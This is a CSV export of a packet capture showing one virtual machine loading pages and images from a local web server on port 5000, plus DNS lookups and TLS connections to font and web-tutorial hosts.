"No.","Time","Source","Destination","Protocol","Length","Info","src_mac"
"1057","2023-10-21 13:48:22.571054322","192.168.1.227","192.168.1.183","HTTP","499","GET / HTTP/1.1 ","VMware_65:77:ad"
"1062","2023-10-21 13:48:22.706840036","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=434 Ack=176 Win=64128 Len=0 TSval=2341538781 TSecr=1741518990","VMware_65:77:ad"
"1065","2023-10-21 13:48:22.707123048","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=434 Ack=5968 Win=61568 Len=0 TSval=2341538781 TSecr=1741518991","VMware_65:77:ad"
"1067","2023-10-21 13:48:22.707403512","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [ACK] Seq=434 Ack=7347 Win=60544 Len=0 TSval=2341538781 TSecr=1741518991","VMware_65:77:ad"
"1068","2023-10-21 13:48:22.715584944","192.168.1.227","192.168.1.183","TCP","66","52686  >  5000 [FIN, ACK] Seq=434 Ack=7348 Win=64128 Len=0 TSval=2341538789 TSecr=1741518992","VMware_65:77:ad"
"1089","2023-10-21 13:48:23.452281989","192.168.1.227","192.168.1.254","DNS","80","Standard query 0xf0a9 A fonts.googleapis.com","VMware_65:77:ad"
"1090","2023-10-21 13:48:23.452282360","192.168.1.227","192.168.1.254","DNS","80","Standard query 0x8da8 AAAA fonts.googleapis.com","VMware_65:77:ad"
"1091","2023-10-21 13:48:23.452559019","192.168.1.227","192.168.1.254","DNS","77","Standard query 0xa378 A www.w3schools.com","VMware_65:77:ad"
"1092","2023-10-21 13:48:23.452610628","192.168.1.227","192.168.1.254","DNS","77","Standard query 0x0977 AAAA www.w3schools.com","VMware_65:77:ad"
"1096","2023-10-21 13:48:23.483322960","192.168.1.227","74.125.200.95","TCP","74","53016  >  443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2027201309 TSecr=0 WS=128","VMware_65:77:ad"
"1098","2023-10-21 13:48:23.486984523","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2027201313 TSecr=3154215697","VMware_65:77:ad"
"1099","2023-10-21 13:48:23.499246090","192.168.1.227","192.168.1.183","TCP","74","52692  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341539573 TSecr=0 WS=128","VMware_65:77:ad"
"1101","2023-10-21 13:48:23.499973570","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341539574 TSecr=1741519784","VMware_65:77:ad"
"1102","2023-10-21 13:48:23.500843677","192.168.1.227","192.168.1.183","HTTP","463","GET /static/images/coffeeshop.jpg HTTP/1.1 ","VMware_65:77:ad"
"1104","2023-10-21 13:48:23.502148739","192.168.1.227","192.168.1.183","TCP","74","52708  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341539576 TSecr=0 WS=128","VMware_65:77:ad"
"1106","2023-10-21 13:48:23.502580116","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341539576 TSecr=1741519786","VMware_65:77:ad"
"1107","2023-10-21 13:48:23.503048092","192.168.1.227","192.168.1.183","HTTP","465","GET /static/images/coffeehouse2.jpg HTTP/1.1 ","VMware_65:77:ad"
"1109","2023-10-21 13:48:23.511424772","192.168.1.227","192.168.1.183","TCP","74","52714  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341539585 TSecr=0 WS=128","VMware_65:77:ad"
"1111","2023-10-21 13:48:23.511951234","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341539586 TSecr=1741519796","VMware_65:77:ad"
"1112","2023-10-21 13:48:23.515444975","192.168.1.227","192.168.1.183","HTTP","456","GET /static/images/map.jpg HTTP/1.1 ","VMware_65:77:ad"
"1118","2023-10-21 13:48:23.536815563","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=371 Win=64128 Len=0 TSval=2341539610 TSecr=1741519820","VMware_65:77:ad"
"1119","2023-10-21 13:48:23.536947997","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=369 Win=64128 Len=0 TSval=2341539611 TSecr=1741519820","VMware_65:77:ad"
"1120","2023-10-21 13:48:23.536948027","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=364 Win=64128 Len=0 TSval=2341539611 TSecr=1741519821","VMware_65:77:ad"
"1128","2023-10-21 13:48:23.537693707","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=7609 Win=60672 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1130","2023-10-21 13:48:23.537693817","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=7604 Win=60672 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1132","2023-10-21 13:48:23.537693837","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=13396 Win=56704 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1135","2023-10-21 13:48:23.538218007","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=16292 Win=54656 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1136","2023-10-21 13:48:23.538218108","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=7611 Win=60672 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1137","2023-10-21 13:48:23.538218128","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=13401 Win=61568 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1138","2023-10-21 13:48:23.538218148","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=8563 Win=64128 Len=0 TSval=2341539612 TSecr=1741519821","VMware_65:77:ad"
"1139","2023-10-21 13:48:23.538218178","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=14355 Win=60544 Len=0 TSval=2341539612 TSecr=1741519822","VMware_65:77:ad"
"1140","2023-10-21 13:48:23.538218198","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=16753 Win=62592 Len=0 TSval=2341539612 TSecr=1741519822","VMware_65:77:ad"
"1142","2023-10-21 13:48:23.538479096","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=23993 Win=71168 Len=0 TSval=2341539612 TSecr=1741519822","VMware_65:77:ad"
"1147","2023-10-21 13:48:23.538884875","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=27876 Win=46848 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1148","2023-10-21 13:48:23.538884955","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=42356 Win=37120 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1149","2023-10-21 13:48:23.538956943","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=24491 Win=58752 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1151","2023-10-21 13:48:23.539246331","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [ACK] Seq=400 Ack=31046 Win=53760 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1154","2023-10-21 13:48:23.539603802","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=48148 Win=61568 Len=0 TSval=2341539613 TSecr=1741519822","VMware_65:77:ad"
"1157","2023-10-21 13:48:23.539780440","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=24945 Win=74112 Len=0 TSval=2341539613 TSecr=1741519823","VMware_65:77:ad"
"1158","2023-10-21 13:48:23.540102690","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=32185 Win=71168 Len=0 TSval=2341539614 TSecr=1741519823","VMware_65:77:ad"
"1159","2023-10-21 13:48:23.540102790","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=69868 Win=51072 Len=0 TSval=2341539614 TSecr=1741519823","VMware_65:77:ad"
"1164","2023-10-21 13:48:23.540102820","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=40873 Win=65280 Len=0 TSval=2341539614 TSecr=1741519823","VMware_65:77:ad"
"1165","2023-10-21 13:48:23.540102841","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=48113 Win=60416 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1166","2023-10-21 13:48:23.540517443","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=80004 Win=84480 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1168","2023-10-21 13:48:23.540517543","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=109716 Win=143872 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1172","2023-10-21 13:48:23.541433830","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [ACK] Seq=398 Ack=49521 Win=75008 Len=0 TSval=2341539614 TSecr=1741519824","VMware_65:77:ad"
"1173","2023-10-21 13:48:23.541433900","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=111860 Win=148096 Len=0 TSval=2341539615 TSecr=1741519824","VMware_65:77:ad"
"1174","2023-10-21 13:48:23.541433930","192.168.1.227","192.168.1.183","TCP","66","52708  >  5000 [FIN, ACK] Seq=400 Ack=31046 Win=64128 Len=0 TSval=2341539615 TSecr=1741519822","VMware_65:77:ad"
"1176","2023-10-21 13:48:23.541433950","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=142268 Win=208896 Len=0 TSval=2341539615 TSecr=1741519825","VMware_65:77:ad"
"1177","2023-10-21 13:48:23.541433970","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=143716 Win=211840 Len=0 TSval=2341539615 TSecr=1741519825","VMware_65:77:ad"
"1178","2023-10-21 13:48:23.541434001","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [ACK] Seq=391 Ack=169780 Win=263936 Len=0 TSval=2341539615 TSecr=1741519825","VMware_65:77:ad"
"1179","2023-10-21 13:48:23.542940793","192.168.1.227","192.168.1.183","TCP","66","52692  >  5000 [FIN, ACK] Seq=398 Ack=50157 Win=75008 Len=0 TSval=2341539617 TSecr=1741519824","VMware_65:77:ad"
"1182","2023-10-21 13:48:23.555631148","192.168.1.227","192.229.179.87","TCP","74","36704  >  443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=3909217046 TSecr=0 WS=128","VMware_65:77:ad"
"1183","2023-10-21 13:48:23.555631559","192.168.1.227","192.168.1.183","TCP","66","52714  >  5000 [FIN, ACK] Seq=391 Ack=170980 Win=266880 Len=0 TSval=2341539630 TSecr=1741519825","VMware_65:77:ad"
"1186","2023-10-21 13:48:23.558509865","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=3909217049 TSecr=1197392397","VMware_65:77:ad"
"1189","2023-10-21 13:48:23.822341097","192.168.1.227","74.125.200.95","TLSv1.3","1134","Client Hello","VMware_65:77:ad"
"1190","2023-10-21 13:48:23.823409193","192.168.1.227","192.229.179.87","TLSv1.3","1043","Client Hello","VMware_65:77:ad"
"1194","2023-10-21 13:48:23.825983861","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1069 Ack=197 Win=64128 Len=0 TSval=2027201652 TSecr=3154216037","VMware_65:77:ad"
"1196","2023-10-21 13:48:23.827107146","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=978 Ack=4004 Win=62592 Len=0 TSval=3909217318 TSecr=1197392666","VMware_65:77:ad"
"1197","2023-10-21 13:48:23.834033989","192.168.1.227","74.125.200.95","TLSv1.3","156","Application Data","VMware_65:77:ad"
"1199","2023-10-21 13:48:23.839446634","192.168.1.227","74.125.200.95","TLSv1.3","128","Application Data","VMware_65:77:ad"
"1200","2023-10-21 13:48:23.839522560","192.168.1.227","74.125.200.95","TLSv1.3","137","Application Data","VMware_65:77:ad"
"1201","2023-10-21 13:48:23.839730703","192.168.1.227","74.125.200.95","TLSv1.3","117","Application Data","VMware_65:77:ad"
"1202","2023-10-21 13:48:23.841857583","192.168.1.227","74.125.200.95","TLSv1.3","113","Application Data","VMware_65:77:ad"
"1206","2023-10-21 13:48:23.846405492","192.168.1.227","74.125.200.95","TLSv1.3","431","Application Data","VMware_65:77:ad"
"1212","2023-10-21 13:48:23.853721970","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1755 Ack=2363 Win=62720 Len=0 TSval=2027201679 TSecr=3154216064","VMware_65:77:ad"
"1213","2023-10-21 13:48:23.859811713","192.168.1.227","74.125.200.95","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1215","2023-10-21 13:48:23.869498456","192.168.1.227","192.229.179.87","TLSv1.3","156","Application Data","VMware_65:77:ad"
"1216","2023-10-21 13:48:23.870230037","192.168.1.227","192.229.179.87","TLSv1.3","128","Application Data","VMware_65:77:ad"
"1217","2023-10-21 13:48:23.870414415","192.168.1.227","192.229.179.87","TLSv1.3","137","Application Data","VMware_65:77:ad"
"1218","2023-10-21 13:48:23.870936450","192.168.1.227","192.229.179.87","TLSv1.3","117","Application Data","VMware_65:77:ad"
"1219","2023-10-21 13:48:23.870989652","192.168.1.227","192.229.179.87","TLSv1.3","424","Application Data","VMware_65:77:ad"
"1226","2023-10-21 13:48:23.874460259","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4259 Win=64128 Len=0 TSval=3909217365 TSecr=1197392710","VMware_65:77:ad"
"1227","2023-10-21 13:48:23.874507189","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4514 Win=64000 Len=0 TSval=3909217365 TSecr=1197392711","VMware_65:77:ad"
"1228","2023-10-21 13:48:23.874507239","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4610 Win=64000 Len=0 TSval=3909217365 TSecr=1197392711","VMware_65:77:ad"
"1229","2023-10-21 13:48:23.874549820","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=4641 Win=64000 Len=0 TSval=3909217366 TSecr=1197392711","VMware_65:77:ad"
"1232","2023-10-21 13:48:23.874904927","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=8985 Win=61568 Len=0 TSval=3909217366 TSecr=1197392713","VMware_65:77:ad"
"1233","2023-10-21 13:48:23.874904977","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [ACK] Seq=1610 Ack=10284 Win=60416 Len=0 TSval=3909217366 TSecr=1197392713","VMware_65:77:ad"
"1234","2023-10-21 13:48:23.875430343","192.168.1.227","192.229.179.87","TLSv1.3","113","Application Data","VMware_65:77:ad"
"1237","2023-10-21 13:48:24.082918465","192.168.1.227","192.168.1.183","TCP","74","52720  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341540156 TSecr=0 WS=128","VMware_65:77:ad"
"1239","2023-10-21 13:48:24.083670709","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341540158 TSecr=1741520367","VMware_65:77:ad"
"1240","2023-10-21 13:48:24.084080470","192.168.1.227","192.168.1.183","HTTP","464","GET /static/images/coffeehouse.jpg HTTP/1.1 ","VMware_65:77:ad"
"1244","2023-10-21 13:48:24.086469880","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=370 Win=64128 Len=0 TSval=2341540160 TSecr=1741520370","VMware_65:77:ad"
"1246","2023-10-21 13:48:24.086616931","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=7610 Win=60672 Len=0 TSval=2341540160 TSecr=1741520371","VMware_65:77:ad"
"1247","2023-10-21 13:48:24.086662609","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=8562 Win=59776 Len=0 TSval=2341540161 TSecr=1741520371","VMware_65:77:ad"
"1249","2023-10-21 13:48:24.087157954","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=16754 Win=53632 Len=0 TSval=2341540161 TSecr=1741520371","VMware_65:77:ad"
"1252","2023-10-21 13:48:24.087564767","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=24946 Win=59648 Len=0 TSval=2341540161 TSecr=1741520371","VMware_65:77:ad"
"1255","2023-10-21 13:48:24.087804115","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=32186 Win=60672 Len=0 TSval=2341540162 TSecr=1741520371","VMware_65:77:ad"
"1256","2023-10-21 13:48:24.087804185","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=33138 Win=59776 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1258","2023-10-21 13:48:24.087960936","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=40378 Win=60672 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1260","2023-10-21 13:48:24.088238387","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=41330 Win=64128 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1262","2023-10-21 13:48:24.088397672","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=48570 Win=60672 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1263","2023-10-21 13:48:24.088443380","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=49522 Win=59776 Len=0 TSval=2341540162 TSecr=1741520372","VMware_65:77:ad"
"1267","2023-10-21 13:48:24.088910364","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=57714 Win=80512 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1269","2023-10-21 13:48:24.088910454","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=64954 Win=94976 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1270","2023-10-21 13:48:24.089046945","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=67850 Win=100864 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1272","2023-10-21 13:48:24.089214005","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [ACK] Seq=399 Ack=68813 Win=103680 Len=0 TSval=2341540163 TSecr=1741520373","VMware_65:77:ad"
"1273","2023-10-21 13:48:24.091602707","192.168.1.227","192.168.1.183","TCP","66","52720  >  5000 [FIN, ACK] Seq=399 Ack=68814 Win=103680 Len=0 TSval=2341540165 TSecr=1741520373","VMware_65:77:ad"
"1275","2023-10-21 13:48:24.216414015","192.168.1.227","192.168.1.254","DNS","77","Standard query 0xad68 A fonts.gstatic.com","VMware_65:77:ad"
"1276","2023-10-21 13:48:24.216414656","192.168.1.227","192.168.1.254","DNS","77","Standard query 0x746d AAAA fonts.gstatic.com","VMware_65:77:ad"
"1279","2023-10-21 13:48:24.231922237","192.168.1.227","142.251.10.94","TCP","74","49592  >  443 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=831660084 TSecr=0 WS=128","VMware_65:77:ad"
"1281","2023-10-21 13:48:24.235155359","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=831660088 TSecr=4285554289","VMware_65:77:ad"
"1282","2023-10-21 13:48:24.242076485","192.168.1.227","142.251.10.94","TLSv1.3","1131","Client Hello","VMware_65:77:ad"
"1285","2023-10-21 13:48:24.245635778","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1066 Ack=197 Win=64128 Len=0 TSval=831660099 TSecr=4285554300","VMware_65:77:ad"
"1286","2023-10-21 13:48:24.249713512","192.168.1.227","142.251.10.94","TLSv1.3","156","Application Data","VMware_65:77:ad"
"1287","2023-10-21 13:48:24.250444009","192.168.1.227","142.251.10.94","TLSv1.3","128","Application Data","VMware_65:77:ad"
"1288","2023-10-21 13:48:24.250579831","192.168.1.227","142.251.10.94","TLSv1.3","137","Application Data","VMware_65:77:ad"
"1289","2023-10-21 13:48:24.250635638","192.168.1.227","142.251.10.94","TLSv1.3","117","Application Data","VMware_65:77:ad"
"1290","2023-10-21 13:48:24.251636284","192.168.1.227","142.251.10.94","TLSv1.3","495","Application Data","VMware_65:77:ad"
"1294","2023-10-21 13:48:24.253203935","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1769 Ack=876 Win=64128 Len=0 TSval=831660106 TSecr=4285554307","VMware_65:77:ad"
"1295","2023-10-21 13:48:24.253766795","192.168.1.227","142.251.10.94","TLSv1.3","113","Application Data","VMware_65:77:ad"
"1305","2023-10-21 13:48:24.256471696","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1816 Ack=18219 Win=52096 Len=0 TSval=831660109 TSecr=4285554310","VMware_65:77:ad"
"1308","2023-10-21 13:48:24.258425745","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=1816 Ack=19494 Win=64128 Len=0 TSval=831660111 TSecr=4285554311","VMware_65:77:ad"
"1309","2023-10-21 13:48:24.259224578","192.168.1.227","142.251.10.94","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1317","2023-10-21 13:48:24.544675047","192.168.1.227","192.168.1.183","TCP","74","52730  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341540618 TSecr=0 WS=128","VMware_65:77:ad"
"1319","2023-10-21 13:48:24.545343697","192.168.1.227","192.168.1.183","TCP","66","52730  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341540619 TSecr=1741520829","VMware_65:77:ad"
"1320","2023-10-21 13:48:24.545704649","192.168.1.227","192.168.1.183","HTTP","446","GET /favicon.ico HTTP/1.1 ","VMware_65:77:ad"
"1324","2023-10-21 13:48:24.555059996","192.168.1.227","192.168.1.183","TCP","66","52730  >  5000 [ACK] Seq=381 Ack=182 Win=64128 Len=0 TSval=2341540629 TSecr=1741520839","VMware_65:77:ad"
